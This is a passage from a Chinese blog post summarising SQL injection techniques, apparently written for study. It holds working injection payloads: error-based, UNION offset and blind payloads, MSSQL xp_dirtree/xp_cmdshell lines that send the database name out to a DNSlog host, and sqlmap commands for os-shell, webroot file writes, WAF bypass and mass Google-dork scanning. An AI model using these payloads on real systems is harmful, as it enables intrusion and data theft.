class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">        mysql_query(<span class="string">'set names utf8'</span>);</span><br><span class="line">        @mysql_select_db(<span class="string">'test2'</span>, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">        $select_sql=<span class="string">"SELECT * FROM users WHERE id='$id' limit 0,1"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $select_sql;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        $select_sql_result=mysql_query($select_sql,$conn);</span><br><span class="line">        $data=mysql_fetch_row($select_sql_result);</span><br><span class="line">        mysql_free_result($select_sql_result);</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;&lt;br/&gt;&lt;p&gt;"</span>;</span><br><span class="line">        print_r($data);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当 <code>POST</code> 的数据是 <code>id=1%2527</code> 时，数据发送到服务端会解码一次变为 <code>id=1%27</code>  ，由于没有敏感字符，经过 <code>addslashes()</code> 函数过滤后，还是 <code>id=1%27</code>，此时再经过 <code>urldecode()</code> 解码函数，数据为 <code>id=1&#39;</code> 带入到 SQL 语句如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;1&apos;&apos; limit 0, 1</span><br></pre></td></tr></table></figure>

<p><img src="/images/196SQLsum4.png" alt></p>
<p>如把 <code>urldecode()</code> 函数和 <code>addslashes()</code> 函数交换位置，<code>id=1%2527</code> 经服务器解码后为 <code>id=1%27</code> 然后再经 <code>urldecode()</code> 函数解码为 <code>id=1&#39;</code> ，然后再由 <code>addslashes()</code> 后为 <code>id=1\&#39;</code> ，可以看出来返回数据。</p>
<p><img src="/images/196SQLsum3.png" alt></p>
<h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行转义，但是 <code>addslashes</code> 虽然参数在过滤后会添加 <code>\</code> 进行转义，但 <code>\</code> 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p>
<p>在将数据存入到了数据库中之后，开发者认为数据是可信的，下次需要进行查询的时候，直接从数据库中取出脏数据，没有进行检验和处理，这样会造成 <code>SQL</code> 的二次注入。</p>
<p><img src="/images/194secinjec.png" alt></p>
<p>二次注入原理，主要分为两步：</p>
<ul>
<li><p>插入恶意数据</p>
<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p>
</li>
<li><p>引用恶意数据</p>
<p>将数据存入到数据库中后，开发者认为数据是可信的。下次需要查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验何处理。</p>
</li>
</ul>
<h4 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h4><p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.png" alt></p>
<p>如何防止宽字节注入？</p>
<ul>
<li>使用 <code>mysql_set_charset(&quot;GBK&quot;)</code></li>
<li>使用 <code>mysql_real_escape_string($id)</code></li>
</ul>
<p><img src="/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51.png" alt></p>
<h4 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h4><p><code>HTTP</code> 头部部分参数详解</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>User-Agent</td>
<td>浏览器向服务器表名自己的身份，使得服务器能够识别客户使用的操作系统，浏览器版本</td>
</tr>
<tr>
<td>Cookie</td>
<td>网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据</td>
</tr>
<tr>
<td>X-Forwarded-For</td>
<td>简称 XFF 头，它代表客户端，HTTP 请求端真是的 IP</td>
</tr>
<tr>
<td>Referer</td>
<td>浏览器向 Web 服务器表名自己从哪个页面链接过来的</td>
</tr>
<tr>
<td>Host</td>
<td>客户端指定自己想访问的 Web 服务器的域名/ IP 地址和端口号</td>
</tr>
</tbody></table>
<p><img src="/images/197User_Agent.png" alt></p>
<p><img src="/images/197XFF.png" alt></p>
<h4 id="盲注步骤"><a href="#盲注步骤" class="headerlink" title="盲注步骤"></a>盲注步骤</h4><ol>
<li>先用 <code>count()</code> 判断个数</li>
<li>再用 <code>length()</code> 依次判断各个库名，表名，字段名的长度</li>
<li>用 <code>ascii()</code> + <code>substr()</code> + <code>if()</code> 结合判断出每个字符</li>
</ol>
<h4 id="外带查询原理"><a href="#外带查询原理" class="headerlink" title="外带查询原理"></a>外带查询原理</h4><p><img src="/images/197DNS.png" alt></p>
<p><code>MSSQL</code> 下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用<code>DNSlog</code> 接收外传的数据。常用的函数有：</p>
<ul>
<li><code>xp_subdirs</code></li>
<li><code>xp_dirtree</code></li>
<li><code>xp_fileexist</code></li>
<li><code>xp_cmdshell</code></li>
</ul>
<p>前三个存储过程的效果和使用方法几乎一致。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=db_name();</span><br><span class="line">exec(&apos;master..xp_dirtree &quot;//&apos; %2B @a %2B &apos;.o0k708.ceye.io/123&quot;&apos;)</span><br></pre></td></tr></table></figure>

<p><code>xp_cmdshell</code> 要求必须为 <code>DBA</code> 权限下才可使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &apos;show advanced options&apos;,1;</span><br><span class="line">reconfigure;</span><br><span class="line">sp_configure &apos;xp_cmdshell&apos;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024); </span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure>

<h3 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h3><p><img src="/images/197SQL%E6%B3%A8%E5%85%A5.png" alt></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="/images/197%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt></p>
<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p><img src="/images/197%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png" alt></p>
<h5 id="移位溢注（使用ACCESS和MYSQL）"><a href="#移位溢注（使用ACCESS和MYSQL）" class="headerlink" title="移位溢注（使用ACCESS和MYSQL）"></a>移位溢注（使用ACCESS和MYSQL）</h5><p>可以在获取不了列名的情况下获取数据，但是要求后面的表个字段数小于前面表的字段数。</p>
<p>偏移注入的步骤：</p>
<ol>
<li>判断注入点</li>
<li>order by 判断长度</li>
<li>判断表名</li>
<li>联合查询</li>
<li>获取表中列数</li>
<li>开始偏移注入</li>
</ol>
<p>使用新方法注入：</p>
<p>获取 admin 表的列数：</p>
<p>用 <code>order by 24</code> 判断出字段长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,* FROM admin</span><br><span class="line"># 返回错误页面</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* FROM admin</span><br><span class="line"># 返回正确页面，因此admin表列数为4</span><br><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* FROM admin</span><br></pre></td></tr></table></figure>

<p>判断出页面那些位置能够显示数据，比如 13, 14 可以显示数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,admin.*,17,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure>

<p><code>admin</code> 表的前两列能够显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3,4,5,6,7,8,9,10,admin.*,15,1617,18,19,20,21,22,23,24 FROM admin</span><br></pre></td></tr></table></figure>

<p><code>admin</code> 表的后两列能够显示</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="/images/197%E6%8F%90%E6%9D%83.png" alt></p>
<h5 id="sqlmap-–os-shell-原理"><a href="#sqlmap-–os-shell-原理" class="headerlink" title="sqlmap –os-shell 原理"></a>sqlmap –os-shell 原理</h5><p><code>--os-shell</code> 流程</p>
<p><img src="/images/os_shell.png" alt></p>
<p>命令行界面：</p>
<p><img src="/images/os_shell.jpg" alt></p>
<p><code>--os-shell</code> 需要的条件：</p>
<ul>
<li><code>FILE</code> 权限</li>
<li>可写的绝对路径</li>
<li><code>PHP GPC</code> OFF</li>
</ul>
<p>原理简述：通过 <code>MySQL</code> 的 <code>into outfile</code> 和 <code>into dumpfile</code> 向网站目录下写入 <code>php</code> 代码，用来执行系统命令。</p>
<h4 id="MySQL-注入常用函数"><a href="#MySQL-注入常用函数" class="headerlink" title="MySQL 注入常用函数"></a>MySQL 注入常用函数</h4><table>
<thead>
<tr>
<th>函数名称</th>
<th>函数功能</th>
<th></th>
<th>函数名称</th>
<th>函数功能</th>
</tr>
</thead>
<tbody><tr>
<td>system_user()</td>
<td>系统用户名</td>
<td></td>
<td>concat()</td>
<td>没有分隔符地连接字符串</td>
</tr>
<tr>
<td>user()</td>
<td>用户名</td>
<td></td>
<td>concat_ws()</td>
<td>含有分隔符地连接字符串</td>
</tr>
<tr>
<td>current_user()</td>
<td>当前用户名</td>
<td></td>
<td>group_concat()</td>
<td>连接一个组所有字符串，并以逗号分隔每条数据</td>
</tr>
<tr>
<td>session_user()</td>
<td>连接数据库的用户名</td>
<td></td>
<td>load_file()</td>
<td>读取本地文件</td>
</tr>
<tr>
<td>database()</td>
<td>数据库名</td>
<td></td>
<td>into outfile()</td>
<td>写文件</td>
</tr>
<tr>
<td>version()</td>
<td>数据库版本</td>
<td></td>
<td>ascii()</td>
<td>字符串的 ASCII 码值</td>
</tr>
<tr>
<td>@@datadir</td>
<td>数据库路径</td>
<td></td>
<td>ord()</td>
<td>返回字符串第一个字符的 ASCII 值</td>
</tr>
<tr>
<td>@@basedir</td>
<td>数据库安装路径</td>
<td></td>
<td>mid()/substr()</td>
<td>返回一个字符串的一部分</td>
</tr>
<tr>
<td>@@version_compile_os</td>
<td>操作系统</td>
<td></td>
<td>length()</td>
<td>返回字符串长度</td>
</tr>
<tr>
<td>count()</td>
<td>返回执行结果数量</td>
<td></td>
<td>sleep()</td>
<td>让语句运行N秒钟</td>
</tr>
<tr>
<td>left()</td>
<td>返回字符串最左边几个字符</td>
<td></td>
<td>if()</td>
<td>&gt; select if(1&gt;2,2,3);-&gt; 3</td>
</tr>
<tr>
<td>floor()</td>
<td>返回小于或等于 x 的最大整数</td>
<td></td>
<td>char()</td>
<td>返回 ASCII 代码组成的字符串</td>
</tr>
<tr>
<td>extractvalue()</td>
<td>用于报错注入</td>
<td></td>
<td>updatexml()</td>
<td>用于报错注入</td>
</tr>
<tr>
<td>strcmp()</td>
<td>比较字符串内容</td>
<td></td>
<td>exp()</td>
<td>返回 e 的 x 次方</td>
</tr>
</tbody></table>
<p>常用的报错注入语句如下：</p>
<ul>
<li>floor()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(user()/*存放要查询的 SQL 语句*/,floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>

<ul>
<li>extractvalue()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e)));</span><br></pre></td></tr></table></figure>

<ul>
<li>updatexml()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e),1));</span><br></pre></td></tr></table></figure>

<h4 id="sqlmap-的使用"><a href="#sqlmap-的使用" class="headerlink" title="sqlmap 的使用"></a>sqlmap 的使用</h4><h5 id="指定-sqlmap-的探测技术"><a href="#指定-sqlmap-的探测技术" class="headerlink" title="指定 sqlmap 的探测技术"></a>指定 <code>sqlmap</code> 的探测技术</h5><p><code>--technique=TECH</code></p>
<ul>
<li>B: Boolean-based blind SQL injection</li>
<li>E: Error-based SQL injection</li>
<li>U: UNION query SQL injection</li>
<li>S: Stacked queries SQL injection</li>
<li>T: Time-based blind SQL injection</li>
</ul>
<h5 id="指定注入参数"><a href="#指定注入参数" class="headerlink" title="指定注入参数"></a>指定注入参数</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> -p <span class="string">"id, user-agent"</span></span><br></pre></td></tr></table></figure>

<h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>好处：</p>
<pre><code>1. 方便测试某些网站
 2. 代理关联上 `burp` ，方便我们学习 `sqlmap` 发包规则</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure>

<p>设置好 <code>burp</code> ，可以在代理界面看到 <code>sqlmap</code> 发送的数据包。</p>
<h5 id="三种级别：详细程度-探测-风险"><a href="#三种级别：详细程度-探测-风险" class="headerlink" title="三种级别：详细程度/探测/风险"></a>三种级别：详细程度/探测/风险</h5><ul>
<li>详细程度：注入时 <code>sqlmap</code> 的界面显示的内容详细程度，级别程度为 0-6 ，默认为 1 ，指定参数用 <code>-v</code> 来表示。</li>
</ul>
<table>
<thead>
<tr>
<th align="center">级别</th>
<th align="center">介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">只显示 python 错误以及严重的信息</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">同时显示基本信息和警告信息</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">同时显示 debug 信息</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">同时显示注入的 payload</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">同时显示 HTTP 请求头</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">同时显示 HTTP 响应头</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">同时显示 HTTP 响应页面</td>
</tr>
</tbody></table>
<ul>
<li>探测等级：指注入的 <code>payload</code> 语句的复杂程度，级别为 1-5，默认为 1 。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --level=LEVEL</span><br></pre></td></tr></table></figure>

<ol>
<li>使用哪些 <code>payload</code> 也影响注入点的选择</li>
<li><code>GET/POST</code> 都会测试，<code>level 2</code> 时，会测试 <code>cookie</code> ，<code>level 3</code> 时，会测试 <code>User-Agent</code> 和 <code>Referer</code>。</li>
</ol>
<ul>
<li>风险等级：指是否要使用具有不同级别风险的测试语句，级别为 1-3，默认为 1 。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --risk=RISK</span><br></pre></td></tr></table></figure>

<h5 id="跳过某些参数"><a href="#跳过某些参数" class="headerlink" title="跳过某些参数"></a>跳过某些参数</h5><ul>
<li>跳过注入参宿</li>
</ul>
<p>使用很大的 <code>level</code> 等级，但有些参数并不需要测试，就可以使用 <code>--skip</code> 参数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"url"</span> --skip=<span class="string">"user-agent.referer"</span></span><br></pre></td></tr></table></figure>

<ul>
<li>跳过 <code>URL</code> 编码</li>
</ul>
<p>注入测试语句不经过 <code>url</code> 编码发送到服务器上。</p>
<ul>
<li>绕过 <code>URL</code> 重写规则</li>
</ul>
<p>有些时候 <code>Web</code> 服务器使用了 <code>URL</code> 重写，导致无法直接使用 <code>sqlmap</code> 测试参数，如 <a href="http://www.info.com/1018/2019.html" target="_blank" rel="noopener">测试URL</a> 这种格式的网址，在测试的参数后面加 <code>*</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://xxxx/info/1018*/2347.html"</span></span><br></pre></td></tr></table></figure>

<h5 id="闭合注入-Payload"><a href="#闭合注入-Payload" class="headerlink" title="闭合注入 Payload"></a>闭合注入 <code>Payload</code></h5><p>有些环境中，需要在注入的 <code>payload</code> 的前面或后面加一些字符来闭合符号，以保证 <code>payload</code> 的正常执行。</p>
<p>如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时需要使用 <code>--prefix</code> 和 <code>--suffix</code> 参数，来进行闭合：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.111/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p id --prefix <span class="string">"')"</span> --suffix <span class="string">"AND ('abc'='abc"</span></span><br></pre></td></tr></table></figure>

<p>这样执行的 <code>SQL</code> 语句变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0,1"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="绕过-WAF-设备"><a href="#绕过-WAF-设备" class="headerlink" title="绕过 WAF 设备"></a>绕过 <code>WAF</code> 设备</h5><p><code>--tamper=TAMPER</code>，可以查看 <code>tamper/</code> 目录下有哪些可用的脚本。</p>
<h5 id="结合-Burp-使用"><a href="#结合-Burp-使用" class="headerlink" title="结合 Burp 使用"></a>结合 <code>Burp</code> 使用</h5><p>复制 <code>burp</code> 拦截的 <code>HTTP</code> 请求包，保存为 <code>1.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">'path/1.txt'</span></span><br></pre></td></tr></table></figure>

<h5 id="批量扫描-burp-请求日志"><a href="#批量扫描-burp-请求日志" class="headerlink" title="批量扫描 burp 请求日志"></a>批量扫描 <code>burp</code> 请求日志</h5><ol>
<li>首先配置 <code>burp</code> 记录所有的 <code>request</code> 请求，并保存在指定文件夹</li>
</ol>
<p><img src="/images/197burp.png" alt></p>
<ol start="2">
<li>接着浏览器设置 <code>burp</code> 代理，访问测试 url ，查看 <code>sql.txt</code>。</li>
</ol>
<p><img src="/images/197sqltxt.png" alt></p>
<pre><code>3. 使用 `sqlmap` 扫描。</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l sql.txt --batch --smart <span class="comment"># batch 会自动选择 yes; smart 启动快速判断，节约时间</span></span><br></pre></td></tr></table></figure>

<h5 id="批量扫描文本中的多个目标"><a href="#批量扫描文本中的多个目标" class="headerlink" title="批量扫描文本中的多个目标"></a>批量扫描文本中的多个目标</h5><p>文本中保存 <code>url</code> 格式如下，<code>sqlmap</code> 会一个一个检测。</p>
<p><img src="/images/197sqlurltxt.png" alt></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -m url.txt</span><br></pre></td></tr></table></figure>

<h5 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h5><p>参数：<code>--scope</code></p>
<p>例如：只想要 www 开头，.com/.net/.org 结尾的网址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -l burp.log --scope=<span class="string">"(www)?\.target\.(com|net|org)"</span></span><br></pre></td></tr></table></figure>

<h5 id="利用谷歌批量扫"><a href="#利用谷歌批量扫" class="headerlink" title="利用谷歌批量扫"></a>利用谷歌批量扫</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:\".php?id=1\""</span></span><br></pre></td></tr></table></figure>

<h5 id="关于文件写入与-shell-获取"><a href="#关于文件写入与-shell-获取" class="headerlink" title="关于文件写入与 shell 获取"></a>关于文件写入与 <code>shell</code> 获取</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--sql-shell					<span class="comment"># 执行指定 sql 命令</span></span><br><span class="line">--sql-query					<span class="comment"># 执行指定的 sql 语句</span></span><br><span class="line">--file-read					<span class="comment"># 读取指定文件</span></span><br><span class="line">--file-write				<span class="comment"># 写入本地文件</span></span><br><span class="line">--file-write /<span class="built_in">test</span>/test.txt --file-dest /var/www/html/1.txt <span class="comment"># 将本地的test.txt文件写入目标的1.txt</span></span><br><span class="line">--file-dest					<span class="comment"># 要写入文件的绝对路径</span></span><br><span class="line">--os-cmd					<span class="comment"># 执行系统命令</span></span><br><span class="line">--os-shell					<span class="comment"># 系统交互shell</span></span><br><span class="line">--reg-read					<span class="comment"># 读取win系统注册表</span></span><br></pre></td></tr></table></figure>

<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p><code>WAF</code> : Web 应用防护系统，主要是对 Web 特有入侵方式的加强防护。只能防御固有特征的漏洞，无法防御逻辑漏洞/ CSRF 漏洞/SSRF 漏洞</p>
<p>![](/images/197WAF 分类.png)</p>
<h4 id="WAF-工作流程"><a href="#WAF-工作流程" class="headerlink" title="WAF 工作流程"></a>WAF 工作流程</h4><p><img src="/images/197WAF%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png" alt></p>
<h4 id="常见过-WAF技巧"><a href="#常见过-WAF技巧" class="headerlink" title="常见过 WAF技巧"></a>常见过 WAF技巧</h4><p><img src="/images/197%E5%B8%B8%E8%A7%81%E8%BF%87WAF%E6%8A%80%E5%B7%A7.png" alt></p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">TAGGED IN</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/SQL-注入/">SQL 注入</a> <a class="tag tag--primary tag--small t-link" href="/tags/summary/">summary</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/09/10/sqli-labs/"
                    data-tooltip="sqli-labs 学习笔记"
                    aria-label="PREVIOUS: sqli-labs 学习笔记"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/09/07/bluekeep/"
                    data-tooltip="远程桌面代码执行漏洞复现"
                    aria-label="NEXT: 远程桌面代码执行漏洞复现"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Google+"
                    aria-label="Share on Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2019 han. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/09/10/sqli-labs/"
                    data-tooltip="sqli-labs 学习笔记"
                    aria-label="PREVIOUS: sqli-labs 学习笔记"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/2019/09/07/bluekeep/"
                    data-tooltip="远程桌面代码执行漏洞复现"
                    aria-label="NEXT: 远程桌面代码执行漏洞复现"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
